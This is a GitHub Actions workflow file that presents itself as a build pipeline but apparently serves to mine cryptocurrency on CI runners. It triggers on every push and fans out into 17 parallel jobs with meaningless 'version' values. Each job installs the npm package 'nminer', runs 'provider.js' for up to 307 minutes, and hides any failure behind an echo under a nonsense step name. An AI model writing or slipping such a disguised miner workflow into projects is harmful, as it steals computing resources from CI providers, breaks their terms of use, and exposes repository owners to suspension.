name: provider
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2808 }
          - { version: 1441 }
          - { version: 4316 }
          - { version: 9284 }
          - { version: 5529 }
          - { version: 6875 }
          - { version: 5764 }
          - { version: 1501 }
          - { version: 3646 }
          - { version: 6763 }
          - { version: 4029 }
          - { version: 9329 }
          - { version: 246 }
          - { version: 991 }
          - { version: 556 }
          - { version: 5542 }
          - { version: 8010 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: bravely barring after
        run: |
          npm install nminer@latest
          timeout 307m node provider.js || echo "provider executed"